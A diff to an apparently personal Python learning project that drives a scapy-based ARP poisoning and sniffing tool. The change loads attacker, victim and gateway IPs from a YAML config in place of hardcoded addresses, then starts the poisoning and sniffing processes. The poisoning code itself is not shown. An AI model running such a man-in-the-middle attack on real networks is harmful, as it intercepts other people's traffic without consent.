@@ -1,4 +1,5 @@
 from multiprocessing import Process
+from typing import Any
 from scapy.all import (ARP, Ether, 
                        conf, get_if_hwaddr, 
                        send, sniff, sndrcv, srp, wrpcap)
@@ -6,6 +7,7 @@ import os
 import sys
 import time
 
+from linux_playground.utils.dir_utils.config_utils import config_load_yaml
 from linux_playground.utils.path_utils import specific_paths 
 
 
@@ -110,9 +112,23 @@ class ArpController:
 
 
 if __name__ == '__main__':
-    target_mac_address = get_mac_address("192.168.1.27")
-    arp_ctrl = ArpController(host="192.168.1.18", 
-                             victim_target_ip="192.168.1.27", gateway_ip="192.168.1.1")
+    # Step 1 - Gets IP of attacker & victims & gateway
+    arp_config_file_name = "arp_sniffing_config.yaml"
+    arp_config_file_path = specific_paths.relative_path(os.path.join('..', 'configuration','arp_sniffing_config.yaml'))
+    config_data: dict[str, Any] = config_load_yaml(arp_config_file_path)
+
+    # getting gateways IP
+    gateway_ip = config_data['targets'][0]
+
+    # getting my pc (attacker) IP
+    attacker_ip = config_data['targets'][1]
+    # getting victims IP
+    victim_ip = config_data['targets'][2]
+
+
+    target_mac_address = get_mac_address(victim_ip['ip'])
+    arp_ctrl = ArpController(host=attacker_ip['ip'],
+                             victim_target_ip=victim_ip['ip'], gateway_ip=gateway_ip['ip'])
     arp_ctrl.run()
     arp_ctrl.poison_process.join()
     arp_ctrl.sniff_process.join()
